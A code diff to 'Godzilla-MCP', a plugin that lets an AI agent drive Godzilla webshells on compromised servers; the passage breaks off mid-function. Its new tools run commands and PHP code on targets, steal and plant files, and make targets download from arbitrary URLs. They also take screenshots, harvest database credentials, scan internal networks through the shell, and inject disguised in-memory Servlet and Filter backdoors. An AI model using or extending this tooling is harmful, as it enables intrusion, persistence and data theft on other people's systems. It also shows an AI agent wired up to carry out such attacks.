@@ -33,7 +33,7 @@ import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.Executors;
 
 /**
- * Godzilla-MCP Headless Edition v1.1.0
+ * Godzilla-MCP Headless Edition v1.2.0
  * ====================================
  * 基于 hkdonline/Godzilla-MCP（上游改版自 cns1rius/godzilla-mcp）修改，感谢原作者。
  *
@@ -45,6 +45,9 @@ import java.util.concurrent.Executors;
  *   [修复] generate_shell 密钥派生：与 JavaAesBase64/PhpXor.generate 对齐为 md5(secretKey)[0:16]
  *   [修复] read_file 使用 downloadFile 读取文件内容（原为目录枚举接口）
  *   [调整] HTTP 模式监听地址可配置，默认建议 127.0.0.1
+ *   [v1.2] 扩展至 40+ 工具：会话直连/断开、文件全家桶（删除/复制/移动/新建/属性）、
+ *          大文件分块上传下载、远程下载、端口扫描、内存马注入/列表/卸载（Servlet/Filter）、
+ *          流量伪装、Shellcode、ZIP 压缩、数据库枚举、插件库管理（无 GUI 场景）等
  *
  * 仓库: https://github.com/Ch1ngg/Godzilla-MCP-Headless
  */
@@ -59,7 +62,7 @@ public class GodzillaMcpServerPlugin implements Plugin {
 
     private static final String PROTOCOL_VERSION = "2024-11-05";
     private static final String SERVER_NAME = "godzilla-mcp";
-    private static final String SERVER_VERSION = "1.1.0";
+    private static final String SERVER_VERSION = "1.2.0";
     private static final SimpleDateFormat LOG_DATE_FMT = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
     private static PrintWriter logWriter = null;
 
@@ -640,6 +643,113 @@ public class GodzillaMcpServerPlugin implements Plugin {
                             strProp("execSql", "要执行的 SQL 语句")
                     )));
 
+            tools.add(buildToolDef("connect_shell", "直接连接一个 Webshell（无需预先保存，可选 save=true 写入哥斯拉库）", buildSchemaEx(new String[][]{
+                    strProp("url", "Webshell URL"), strProp("password", "连接密码"), strProp("secretKey", "加密密钥")
+            }, new String[][]{
+                    strProp("payload", "Payload 类型，默认 JavaDynamicPayload"), strProp("cryption", "加密方式，默认 JAVA_AES_BASE64"),
+                    boolProp("save", "是否写入哥斯拉库（默认 false）")
+            })));
+            tools.add(buildToolDef("disconnect_shell", "断开（移除）已连接会话；不传 targetUrl 则断开全部", buildSchemaEx(new String[][]{},
+                    new String[][]{ strProp("targetUrl", "目标 URL（可选）") })));
+            tools.add(buildToolDef("list_sessions", "列出当前已缓存的连接会话", buildSchemaEx(new String[][]{}, null)));
+            tools.add(buildToolDef("test_connection", "测试目标连接是否存活并返回用户信息", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL")
+            }, null)));
+            tools.add(buildToolDef("remove_shell", "从哥斯拉库中删除一条保存的 Webshell 记录", buildSchemaEx(new String[][]{
+                    strProp("selector", "URL、ID 或列表序号")
+            }, null)));
+
+            tools.add(buildToolDef("plugin_list", "列出哥斯拉库中已注册的插件 JAR 路径", buildSchemaEx(new String[][]{}, null)));
+            tools.add(buildToolDef("plugin_add", "注册一个插件 JAR 到哥斯拉库（无 GUI 环境同样可用，重启哥斯拉生效）", buildSchemaEx(new String[][]{
+                    strProp("path", "插件 JAR 的本地绝对路径")
+            }, null)));
+            tools.add(buildToolDef("plugin_remove", "从哥斯拉库中移除一个插件 JAR 记录", buildSchemaEx(new String[][]{
+                    strProp("path", "插件 JAR 的本地绝对路径")
+            }, null)));
+
+            tools.add(buildToolDef("current_user", "获取目标当前用户与工作目录", buildSchemaEx(new String[][]{ strProp("targetUrl", "目标 Webshell 的 URL") }, null)));
+            tools.add(buildToolDef("process_list", "列出目标系统进程（Linux: ps / Windows: tasklist）", buildSchemaEx(new String[][]{ strProp("targetUrl", "目标 Webshell 的 URL") }, null)));
+            tools.add(buildToolDef("network_info", "获取目标网络信息（IP、监听端口、连接等）", buildSchemaEx(new String[][]{ strProp("targetUrl", "目标 Webshell 的 URL") }, null)));
+            tools.add(buildToolDef("screenshot", "对目标桌面截图（Java 载荷；无显示环境会返回错误）", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL")
+            }, new String[][]{ strProp("savePath", "本地保存路径（可选，不填则返回 base64）") })));
+
+            tools.add(buildToolDef("exec_code", "在目标执行 PHP 代码（仅 PhpDynamicPayload；要求目标 output_buffering>0，发行版 PHP 默认满足）", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("code", "PHP 代码（不含 <?php）")
+            }, null)));
+
+            tools.add(buildToolDef("write_file", "写入（覆盖）目标文件内容", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("path", "目标文件路径"), strProp("content", "文件内容（文本）")
+            }, null)));
+            tools.add(buildToolDef("download_file", "从目标下载文件到本地（自动分块，支持大文件）", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("remotePath", "目标文件路径"), strProp("localPath", "本地保存路径")
+            }, null)));
+            tools.add(buildToolDef("delete_file", "删除目标文件/目录", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("path", "目标路径")
+            }, null)));
+            tools.add(buildToolDef("copy_file", "在目标上复制文件/目录", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("src", "源路径"), strProp("dest", "目标路径")
+            }, null)));
+            tools.add(buildToolDef("move_file", "在目标上移动/重命名文件", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("src", "源路径"), strProp("dest", "目标路径")
+            }, null)));
+            tools.add(buildToolDef("new_file", "在目标上创建空文件", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("path", "文件路径")
+            }, null)));
+            tools.add(buildToolDef("new_dir", "在目标上创建目录", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("path", "目录路径")
+            }, null)));
+            tools.add(buildToolDef("list_root", "列出目标根目录/盘符", buildSchemaEx(new String[][]{ strProp("targetUrl", "目标 Webshell 的 URL") }, null)));
+            tools.add(buildToolDef("file_size", "获取目标文件大小（字节）", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("path", "目标文件路径")
+            }, null)));
+            tools.add(buildToolDef("file_remote_down", "让目标从指定 URL 下载文件（目标直连下载，不占本地带宽）", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("url", "下载地址"), strProp("savePath", "目标保存路径")
+            }, null)));
+            tools.add(buildToolDef("big_file_upload", "从本地上传大文件到目标（分块传输）", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("localPath", "本地文件路径"), strProp("remotePath", "目标保存路径")
+            }, null)));
+
+            tools.add(buildToolDef("list_databases", "通过 Webshell 隧道列出内网数据库名单", buildSchemaEx(new String[][]{
+                    strProp("host", "数据库主机")
+            }, new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("dbType", "数据库类型: mysql/mssql/oracle/postgresql（默认 mysql）"),
+                    numProp("port", "端口（默认 3306）"), strProp("username", "用户名（默认 root）"), strProp("password", "密码")
+            })));
+            tools.add(buildToolDef("enum_database_conn", "枚举目标应用配置中的数据库连接信息（等效哥斯拉 ShellDriver 插件）", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL")
+            }, null)));
+
+            tools.add(buildToolDef("port_scan", "通过 Webshell 隧道扫描目标内网端口", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("target", "目标 IP/网段"), strProp("ports", "端口列表，如 22,80,8000-8100")
+            }, null)));
+            tools.add(buildToolDef("memory_shell_inject", "向目标 Java Web 应用注入内存马（Servlet/Listener 型）", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("urlPattern", "内存马访问路径，如 /favicon.ico"),
+                    strProp("password", "内存马密码"), strProp("secretKey", "内存马密钥")
+            }, new String[][]{
+                    strProp("shellType", "类型: AES_BASE64/AES_RAW/Behinder/Cknife/ReGeorg（默认 AES_BASE64）")
+            })));
+            tools.add(buildToolDef("memory_shell_list", "列出目标应用中的 Servlet 内存马", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL")
+            }, null)));
+            tools.add(buildToolDef("memory_shell_unload", "卸载目标应用中的内存马（按 wrapperName/urlPattern）", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("wrapperName", "wrapper 名称")
+            }, new String[][]{ strProp("urlPattern", "URL 路径（可选，默认同 wrapperName）") })));
+            tools.add(buildToolDef("filter_shell_add", "注入 Filter 型内存马（带 Cookie 伪装）", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("password", "密码"), strProp("secretKey", "密钥")
+            }, new String[][]{
+                    strProp("cookie", "Cookie 名（可选，默认随机）"), strProp("shellType", "类型: AES_BASE64/AES_RAW（默认 AES_BASE64）")
+            })));
+            tools.add(buildToolDef("filter_shell_list", "列出目标应用中的 Filter 内存马", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL")
+            }, null)));
+            tools.add(buildToolDef("filter_shell_remove", "移除目标应用中的 Filter 内存马", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("filterName", "filter 名称")
+            }, null)));
+            tools.add(buildToolDef("zip", "在目标上压缩/解压 ZIP", buildSchemaEx(new String[][]{
+                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("action", "zip=压缩 / unzip=解压"),
+                    strProp("src", "源路径（压缩=目录，解压=zip文件）"), strProp("dest", "目标路径（压缩=zip路径，解压=目录）")
+            }, null)));
             result.add("tools", tools);
             return result;
         }
@@ -651,6 +761,33 @@ public class GodzillaMcpServerPlugin implements Plugin {
 
         private static String[] numProp(String name, String desc) {
             return new String[]{name, "number", desc};
+        }
+
+        private String[] boolProp(String name, String desc) {
+            return new String[]{name, "boolean", desc};
+        }
+
+        private JsonObject buildSchemaEx(String[][] req, String[][] opt) {
+            JsonObject schema = new JsonObject();
+            schema.addProperty("type", "object");
+            JsonObject props = new JsonObject();
+            JsonArray required = new JsonArray();
+            addProps(props, required, req, true);
+            addProps(props, required, opt, false);
+            schema.add("properties", props);
+            schema.add("required", required);
+            return schema;
+        }
+
+        private void addProps(JsonObject props, JsonArray required, String[][] defs, boolean isRequired) {
+            if (defs == null) return;
+            for (String[] def : defs) {
+                JsonObject prop = new JsonObject();
+                prop.addProperty("type", def[1]);
+                prop.addProperty("description", def[2]);
+                props.add(def[0], prop);
+                if (isRequired) required.add(def[0]);
+            }
         }
 
         // 构建 JSON Schema（可变参数，每个元素是 [name, type, desc]）
@@ -730,6 +867,40 @@ public class GodzillaMcpServerPlugin implements Plugin {
                 case "exec_sql":
                     resultText = executeSqlOnTarget(arguments);
                     break;
+                case "connect_shell": resultText = connectShell(arguments); break;
+                case "disconnect_shell": resultText = disconnectShell(arguments); break;
+                case "list_sessions": resultText = listSessions(); break;
+                case "test_connection": resultText = testConnection(arguments); break;
+                case "remove_shell": resultText = removeShell(arguments); break;
+                case "plugin_list": resultText = pluginList(); break;
+                case "plugin_add": resultText = pluginAdd(arguments); break;
+                case "plugin_remove": resultText = pluginRemove(arguments); break;
+                case "current_user": resultText = currentUserTool(arguments); break;
+                case "process_list": resultText = processListTool(arguments); break;
+                case "network_info": resultText = networkInfoTool(arguments); break;
+                case "screenshot": resultText = screenshotTool(arguments); break;
+                case "exec_code": resultText = execCodeTool(arguments); break;
+                case "write_file": resultText = writeFileTool(arguments); break;
+                case "download_file": resultText = downloadFileTool(arguments); break;
+                case "delete_file": resultText = deleteFileTool(arguments); break;
+                case "copy_file": resultText = copyFileTool(arguments); break;
+                case "move_file": resultText = moveFileTool(arguments); break;
+                case "new_file": resultText = newFileTool(arguments); break;
+                case "new_dir": resultText = newDirTool(arguments); break;
+                case "list_root": resultText = listRootTool(arguments); break;
+                case "file_size": resultText = fileSizeTool(arguments); break;
+                case "file_remote_down": resultText = fileRemoteDownTool(arguments); break;
+                case "big_file_upload": resultText = bigFileUploadTool(arguments); break;
+                case "list_databases": resultText = listDatabasesTool(arguments); break;
+                case "enum_database_conn": resultText = enumDatabaseConnTool(arguments); break;
+                case "port_scan": resultText = portScanTool(arguments); break;
+                case "memory_shell_inject": resultText = memoryShellInjectTool(arguments); break;
+                case "memory_shell_list": resultText = memoryShellListTool(arguments); break;
+                case "memory_shell_unload": resultText = memoryShellUnloadTool(arguments); break;
+                case "filter_shell_add": resultText = filterShellAddTool(arguments); break;
+                case "filter_shell_list": resultText = filterShellListTool(arguments); break;
+                case "filter_shell_remove": resultText = filterShellRemoveTool(arguments); break;
+                case "zip": resultText = zipTool(arguments); break;
                 default:
                     throw new Exception("Unknown tool: " + toolName);
             }
@@ -989,6 +1160,503 @@ public class GodzillaMcpServerPlugin implements Plugin {
             is.close();
             return new String(bos.toByteArray(), StandardCharsets.UTF_8);
         }
+
+    /* ===================== v1.2.0 扩展工具实现 ===================== */
+    private interface TargetOp<T> {
+        T run(Payload p) throws Exception;
+    }
+
+    private <T> T onTarget(JsonObject args, TargetOp<T> op) throws Exception {
+        String url = requireParam(args, "targetUrl");
+        try {
+            return op.run(getOrInitPayload(url));
+        } catch (Exception first) {
+            log("[MCP] 首次执行失败，清缓存重试: " + McpHandler.stringifyError(first));
+            payloadCache.remove(url);
+            return op.run(getOrInitPayload(url));
+        }
+    }
+
+    private static String optString(JsonObject o, String k, String d) {
+        if (o == null || !o.has(k) || o.get(k).isJsonNull()) return d;
+        try { return o.get(k).getAsString(); } catch (Exception e) { return d; }
+    }
+
+    private static boolean optBool(JsonObject o, String k, boolean d) {
+        if (o == null || !o.has(k) || o.get(k).isJsonNull()) return d;
+        try { return o.get(k).getAsBoolean(); } catch (Exception e) { return d; }
+    }
+
+    private static int optInt(JsonObject o, String k, int d) {
+        if (o == null || !o.has(k) || o.get(k).isJsonNull()) return d;
+        try { return o.get(k).getAsInt(); } catch (Exception e) { return d; }
+    }
+
+    private byte[] readResBytes(String path) throws Exception {
+        InputStream is = getClass().getResourceAsStream(path);
+        if (is == null) throw new Exception("Classpath resource not found: " + path);
+        ByteArrayOutputStream bos = new ByteArrayOutputStream();
+        byte[] buf = new byte[8192];
+        int n;
+        while ((n = is.read(buf)) != -1) bos.write(buf, 0, n);
+        is.close();
+        return bos.toByteArray();
+    }
+
+    private static String normalizePorts(String raw) {
+        StringBuilder sb = new StringBuilder();
+        for (String part : raw.split(",")) {
+            part = part.trim();
+            if (part.isEmpty()) continue;
+            if (part.contains("-")) {
+                String[] ab = part.split("-", 2);
+                try {
+                    int a = Integer.parseInt(ab[0].trim());
+                    int b = Integer.parseInt(ab[1].trim());
+                    for (int p = a; p <= b; p++) { if (sb.length() > 0) sb.append(","); sb.append(p); }
+                } catch (Exception e) { if (sb.length() > 0) sb.append(","); sb.append(part); }
+            } else {
+                if (sb.length() > 0) sb.append(",");
+                sb.append(part);
+            }
+        }
+        return sb.toString();
+    }
+
+    // ---------- 会话管理 ----------
+    private String connectShell(JsonObject a) throws Exception {
+        String url = requireParam(a, "url");
+        String password = requireParam(a, "password");
+        String secretKey = requireParam(a, "secretKey");
+        String payloadType = optString(a, "payload", "JavaDynamicPayload");
+        String cryption = optString(a, "cryption", "JAVA_AES_BASE64");
+        boolean save = optBool(a, "save", false);
+        ShellEntity e = new ShellEntity();
+        e.setUrl(url);
+        e.setPassword(password);
+        e.setSecretKey(secretKey);
+        e.setPayload(payloadType);
+        e.setCryption(cryption);
+        e.setEncoding("UTF-8");
+        if (!e.initShellOpertion()) throw new Exception("连接失败：请检查 URL / 密码 / 密钥 / Payload / 加密方式");
+        payloadCache.put(url, e.getPayloadModule());
+        StringBuilder sb = new StringBuilder();
+        sb.append("✓ 连接成功\nURL: ").append(url).append("\nPayload: ").append(payloadType).append("\nCryption: ").append(cryption);
+        if (save) {
+            try { sb.append("\n库写入: ").append(Db.addShell(e) > 0 ? "成功" : "失败(可能已存在)"); }
+            catch (Throwable t) { sb.append("\n库写入异常: ").append(McpHandler.stringifyError(t)); }
+        }
+        return sb.toString();
+    }
+
+    private String disconnectShell(JsonObject a) {
+        String url = optString(a, "targetUrl", null);
+        if (url == null || url.isEmpty()) {
+            int n = payloadCache.size();
+            payloadCache.clear();
+            return "✓ 已断开全部会话（" + n + " 个）";
+        }
+        return payloadCache.remove(url) != null ? "✓ 已断开: " + url : "未找到会话: " + url;
+    }
+
+    private String listSessions() {
+        JsonArray arr = new JsonArray();
+        for (java.util.Map.Entry<String, Payload> en : payloadCache.entrySet()) {
+            JsonObject o = new JsonObject();
+            o.addProperty("url", en.getKey());
+            try { o.addProperty("payloadClass", en.getValue().getClass().getName()); } catch (Throwable t) { }
+            arr.add(o);
+        }
+        return arr.toString();
+    }
+
+    private String testConnection(JsonObject a) throws Exception {
+        String url = requireParam(a, "targetUrl");
+        try {
+            Payload p = getOrInitPayload(url);
+            boolean ok = p.test();
+            return ok ? "✓ 连接存活\nCurrentUser: " + p.currentUserName() : "✗ 连接测试失败";
+        } catch (Exception e) {
+            return "✗ 连接失败: " + McpHandler.stringifyError(e);
+        }
+    }
+
+    private String removeShell(JsonObject a) throws Exception {
+        String selector = requireParam(a, "selector");
+        String id = resolveShellId(selector);
+        if (id == null) throw new Exception("未找到记录: " + selector + "（可用 list_shells 查看）");
+        String url = null;
+        ShellEntity old = Db.getOneShell(id);
+        if (old != null) url = old.getUrl();
+        int r = Db.removeShell(id);
+        if (url != null) payloadCache.remove(url);
+        return r > 0 ? "✓ 已删除记录: " + id + (url != null ? " (" + url + ")" : "") : "删除失败: " + id;
+    }
+
+    private String resolveShellId(String selector) {
+        if (selector == null || selector.isEmpty()) return null;
+        Vector<Vector<String>> rows = Db.getAllShell();
+        for (int i = 1; i < rows.size(); i++) {
+            Vector<String> row = rows.get(i);
+            if (row.size() >= 2 && row.get(1) != null && row.get(1).toString().equals(selector)) return String.valueOf(row.get(0));
+        }
+        for (int i = 1; i < rows.size(); i++) {
+            Vector<String> row = rows.get(i);
+            if (row.size() >= 1 && selector.equals(String.valueOf(row.get(0)))) return selector;
+        }
+        if (selector.matches("\\d+")) {
+            int idx = Integer.parseInt(selector);
+            if (idx >= 1 && idx < rows.size()) return String.valueOf(rows.get(idx).get(0));
+        }
+        return null;
+    }
+
+    // ---------- 哥斯拉库/插件管理（无 GUI 场景） ----------
+    private String pluginList() {
+        String[] plugins = Db.getAllPlugin();
+        JsonArray arr = new JsonArray();
+        for (String s : plugins) arr.add(s);
+        return arr.toString();
+    }
+
+    private String pluginAdd(JsonObject a) throws Exception {
+        String path = requireParam(a, "path");
+        java.io.File f = new java.io.File(path);
+        if (!f.isAbsolute()) f = f.getAbsoluteFile();
+        if (!f.isFile()) throw new Exception("文件不存在: " + f.getAbsolutePath());
+        int r = Db.addPlugin(f.getAbsolutePath());
+        return r > 0 ? "✓ 已注册插件（重启哥斯拉后生效）: " + f.getAbsolutePath()
+                     : "已存在，未重复注册: " + f.getAbsolutePath();
+    }
+
+    private String pluginRemove(JsonObject a) throws Exception {
+        String path = requireParam(a, "path");
+        int r = Db.removePlugin(path);
+        return r > 0 ? "✓ 已移除: " + path : "未找到: " + path;
+    }
+
+    // ---------- 系统信息 ----------
+    private String currentUserTool(JsonObject a) throws Exception {
+        return onTarget(a, p -> "CurrentUser: " + p.currentUserName() + "\nCurrentDir: " + p.currentDir());
+    }
+
+    private String processListTool(JsonObject a) throws Exception {
+        return onTarget(a, p -> toSafeBase64(p.execCommand(p.isWindows() ? "tasklist" : "/bin/sh -c \"ps aux 2>/dev/null || ps -ef\"")));
+    }
+
+    private String networkInfoTool(JsonObject a) throws Exception {
+        return onTarget(a, p -> toSafeBase64(p.execCommand(p.isWindows()
+                ? "cmd /c \"ipconfig /all & netstat -ano\""
+                : "/bin/sh -c \"hostname -i 2>&1; ip addr 2>&1; ifconfig 2>&1; netstat -rn 2>&1; ss -tun 2>&1\"")));
+    }
+
+    private String screenshotTool(JsonObject a) throws Exception {
+        final String savePath = optString(a, "savePath", null);
+        return onTarget(a, p -> {
+            byte[] data = p.evalFunc(null, "screen", new util.http.ReqParameter());
+            if (data == null || data.length == 0) throw new Exception("截图失败：无返回数据");
+            if (data.length < 100) return "截图失败: " + new String(data, StandardCharsets.UTF_8);
+            if (savePath != null && !savePath.isEmpty()) {
+                java.io.File out = new java.io.File(savePath);
+                if (out.getParentFile() != null && !out.getParentFile().exists()) out.getParentFile().mkdirs();
+                java.io.FileOutputStream fos = new java.io.FileOutputStream(out);
+                fos.write(data);
+                fos.close();
+                return "✓ 截图已保存: " + out.getAbsolutePath() + " (" + data.length + " bytes)";
+            }
+            return "data:image/jpeg;base64," + Base64.getEncoder().encodeToString(data);
+        });
+    }
+
+    // ---------- 代码执行（PHP） ----------
+    private String execCodeTool(JsonObject a) throws Exception {
+        final String code = requireParam(a, "code");
+        return onTarget(a, p -> {
+            if (!p.getClass().getName().contains("Php")) {
+                throw new Exception("exec_code 仅支持 PHP 载荷（当前: " + p.getClass().getName() + "）");
+            }
+            if (!p.include("PHP_Eval_Code", readResBytes("/shells/plugins/php/assets/evalCode.php"))) {
+                throw new Exception("PHP_Eval_Code 插件加载失败");
+            }
+            util.http.ReqParameter rp = new util.http.ReqParameter();
+            rp.add("plugin_eval_code", code);
+            return new String(p.evalFunc("PHP_Eval_Code", "xxx", rp), StandardCharsets.UTF_8);
+        });
+    }
+
+    // ---------- 文件操作 ----------
+    private String writeFileTool(JsonObject a) throws Exception {
+        final String path = requireParam(a, "path");
+        final String content = requireParam(a, "content");
+        return onTarget(a, p -> p.uploadFile(path, content.getBytes(StandardCharsets.UTF_8))
+                ? "✓ 写入成功: " + path : "✗ 写入失败: " + path);
+    }
+
+    private String downloadFileTool(JsonObject a) throws Exception {
+        final String remote = requireParam(a, "remotePath");
+        final String local = requireParam(a, "localPath");
+        return onTarget(a, p -> {
+            java.io.File out = new java.io.File(local);
+            if (out.getParentFile() != null && !out.getParentFile().exists()) out.getParentFile().mkdirs();
+            java.io.FileOutputStream fos = new java.io.FileOutputStream(out);
+            long total = 0;
+            try {
+                int size = p.getFileSize(remote);
+                if (size > 0) {
+                    int chunk = 512 * 1024;
+                    int pos = 0;
+                    while (pos < size) {
+                        byte[] buf = p.bigFileDownload(remote, pos, chunk);
+                        if (buf == null || buf.length == 0) break;
+                        fos.write(buf);
+                        total += buf.length;
+                        pos += buf.length;
+                    }
+                } else {
+                    byte[] buf = p.downloadFile(remote);
+                    if (buf == null) throw new Exception("下载失败（文件不存在？）: " + remote);
+                    fos.write(buf);
+                    total = buf.length;
+                }
+            } finally {
+                fos.close();
+            }
+            return "✓ 已下载: " + remote + " -> " + out.getAbsolutePath() + " (" + total + " bytes)";
+        });
+    }
+
+    private String deleteFileTool(JsonObject a) throws Exception {
+        final String path = requireParam(a, "path");
+        return onTarget(a, p -> p.deleteFile(path) ? "✓ 已删除: " + path : "✗ 删除失败: " + path);
+    }
+
+    private String copyFileTool(JsonObject a) throws Exception {
+        final String src = requireParam(a, "src");
+        final String dest = requireParam(a, "dest");
+        return onTarget(a, p -> p.copyFile(src, dest) ? "✓ 已复制: " + src + " -> " + dest : "✗ 复制失败");
+    }
+
+    private String moveFileTool(JsonObject a) throws Exception {
+        final String src = requireParam(a, "src");
+        final String dest = requireParam(a, "dest");
+        return onTarget(a, p -> p.moveFile(src, dest) ? "✓ 已移动: " + src + " -> " + dest : "✗ 移动失败");
+    }
+
+    private String newFileTool(JsonObject a) throws Exception {
+        final String path = requireParam(a, "path");
+        return onTarget(a, p -> p.newFile(path) ? "✓ 已创建文件: " + path : "✗ 创建失败: " + path);
+    }
+
+    private String newDirTool(JsonObject a) throws Exception {
+        final String path = requireParam(a, "path");
+        return onTarget(a, p -> p.newDir(path) ? "✓ 已创建目录: " + path : "✗ 创建失败: " + path);
+    }
+
+    private String listRootTool(JsonObject a) throws Exception {
+        return onTarget(a, p -> {
+            StringBuilder sb = new StringBuilder();
+            for (String s : p.listFileRoot()) { if (sb.length() > 0) sb.append("\n"); sb.append(s); }
+            return sb.toString();
+        });
+    }
+
+    private String fileSizeTool(JsonObject a) throws Exception {
+        final String path = requireParam(a, "path");
+        return onTarget(a, p -> "size: " + p.getFileSize(path) + " bytes (" + path + ")");
+    }
+
+    private String fileRemoteDownTool(JsonObject a) throws Exception {
+        final String url = requireParam(a, "url");
+        final String savePath = requireParam(a, "savePath");
+        return onTarget(a, p -> p.fileRemoteDown(url, savePath)
+                ? "✓ 目标已下载: " + savePath + " <- " + url : "✗ 下载失败: " + url);
+    }
+
+    private String bigFileUploadTool(JsonObject a) throws Exception {
+        final String local = requireParam(a, "localPath");
+        final String remote = requireParam(a, "remotePath");
+        return onTarget(a, p -> {
+            byte[] all = java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(local));
+            int chunk = 512 * 1024;
+            int pos = 0;
+            while (pos < all.length) {
+                int len = Math.min(chunk, all.length - pos);
+                byte[] part = java.util.Arrays.copyOfRange(all, pos, pos + len);
+                String r = p.bigFileUpload(remote, pos, part);
+                if (r != null && !r.trim().isEmpty() && !"ok".equalsIgnoreCase(r.trim())) {
+                    throw new Exception("分块上传失败 @" + pos + ": " + r);
+                }
+                pos += len;
+            }
+            p.bigFileUpload(remote, -1, new byte[0]);
+            return "✓ 上传完成: " + local + " -> " + remote + " (" + all.length + " bytes)";
+        });
+    }
+
+    // ---------- 数据库 ----------
+    private String listDatabasesTool(JsonObject a) throws Exception {
+        final String dbType = optString(a, "dbType", "mysql");
+        final String host = requireParam(a, "host");
+        final int port = optInt(a, "port", 3306);
+        final String username = optString(a, "username", "root");
+        final String password = optString(a, "password", "");
+        String q;
+        if ("mysql".equalsIgnoreCase(dbType)) q = "SHOW DATABASES";
+        else if ("mssql".equalsIgnoreCase(dbType) || "sqlserver".equalsIgnoreCase(dbType)) q = "SELECT name FROM sys.databases";
+        else if ("oracle".equalsIgnoreCase(dbType)) q = "SELECT username FROM all_users";
+        else if ("postgresql".equalsIgnoreCase(dbType)) q = "SELECT datname FROM pg_database";
+        else q = "SELECT 1";
+        final String query = q;
+        return onTarget(a, p -> p.execSql(dbType, host, port, username, password, "select", null, query));
+    }
+
+    private String enumDatabaseConnTool(JsonObject a) throws Exception {
+        return onTarget(a, p -> {
+            if (!p.include("plugin.ShellDriver", readResBytes("/shells/plugins/java/assets/ShellDriver.classs"))) {
+                throw new Exception("ShellDriver 插件加载失败");
+            }
+            return new String(p.evalFunc("plugin.ShellDriver", "run", new util.http.ReqParameter()), StandardCharsets.UTF_8);
+        });
+    }
+
+    // ---------- 高级功能 ----------
+    private String portScanTool(JsonObject a) throws Exception {
+        final String host = requireParam(a, "target");
+        final String ports = normalizePorts(requireParam(a, "ports"));
+        return onTarget(a, p -> {
+            final String className = "plugin.JPortScan";
+            if (!p.include(className, readResBytes("/shells/plugins/java/assets/JPortScan.classs"))) {
+                throw new Exception("端口扫描插件加载失败");
+            }
+            util.http.ReqParameter rp = new util.http.ReqParameter();
+            rp.add("ip", host);
+            rp.add("ports", ports);
+            String result = new String(p.evalFunc(className, "run", rp), StandardCharsets.UTF_8);
+            JsonArray arr = new JsonArray();
+            for (String line : result.split("\n")) {
+                String[] cols = line.split("\t");
+                if (cols.length >= 3) {
+                    JsonObject o = new JsonObject();
+                    o.addProperty("ip", cols[0].trim());
+                    try { o.addProperty("port", Integer.parseInt(cols[1].trim())); } catch (Exception e) { o.addProperty("port", cols[1].trim()); }
+                    o.addProperty("open", "1".equals(cols[2].trim()));
+                    arr.add(o);
+                }
+            }
+            if (arr.size() == 0) return "原始结果:\n" + result;
+            return arr.toString();
+        });
+    }
+
+    private String memoryShellInjectTool(JsonObject a) throws Exception {
+        final String pattern = requireParam(a, "urlPattern");
+        final String password = requireParam(a, "password");
+        final String secretKeyRaw = requireParam(a, "secretKey");
+        final String shellType = optString(a, "shellType", "AES_BASE64");
+        if (!(shellType.equals("AES_BASE64") || shellType.equals("AES_RAW") || shellType.equals("Behinder")
+                || shellType.equals("Cknife") || shellType.equals("ReGeorg"))) {
+            throw new Exception("不支持的 shellType: " + shellType + "（可选 AES_BASE64/AES_RAW/Behinder/Cknife/ReGeorg）");
+        }
+        return onTarget(a, p -> {
+            String secretKey = util.functions.md5(secretKeyRaw).substring(0, 16);
+            String className = "x." + shellType;
+            if (!p.include(className, readResBytes("/shells/plugins/java/assets/" + shellType + ".classs"))) {
+                throw new Exception("include 失败: " + className);
+            }
+            util.http.ReqParameter rp = new util.http.ReqParameter();
+            rp.add("pwd", password);
+            rp.add("secretKey", secretKey);
+            rp.add("path", pattern);
+            String result = new String(p.evalFunc(className, "run", rp), StandardCharsets.UTF_8);
+            return result + "\n提示: 内存马路径 " + pattern + "，可用同密码/密钥 + JAVA_AES_BASE64 连接";
+        });
+    }
+
+    private String memoryShellListTool(JsonObject a) throws Exception {
+        return onTarget(a, p -> {
+            if (!p.include("plugin.ServletManage", readResBytes("/shells/plugins/java/assets/ServletManage.classs"))) {
+                throw new Exception("ServletManage 插件加载失败");
+            }
+            return new String(p.evalFunc("plugin.ServletManage", "getAllServlet", new util.http.ReqParameter()), StandardCharsets.UTF_8);
+        });
+    }
+
+    private String memoryShellUnloadTool(JsonObject a) throws Exception {
+        final String wrapperName = requireParam(a, "wrapperName");
+        final String urlPattern = optString(a, "urlPattern", wrapperName);
+        return onTarget(a, p -> {
+            if (!p.include("plugin.ServletManage", readResBytes("/shells/plugins/java/assets/ServletManage.classs"))) {
+                throw new Exception("ServletManage 插件加载失败");
+            }
